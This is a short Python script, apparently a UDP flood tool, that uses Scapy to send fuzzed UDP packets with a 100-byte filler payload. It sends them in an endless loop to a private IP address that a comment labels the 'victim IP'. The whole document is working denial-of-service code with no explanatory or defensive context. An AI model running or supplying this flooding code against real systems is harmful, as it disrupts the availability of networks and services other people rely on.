from scapy.all import *

payload = 'a' * 100 # any payload with 100+ length

send(IP(dst="192.168.1.108")/fuzz(UDP()/payload),loop=1) # send udp packets to victim IP till script turns off by Ctrl+C
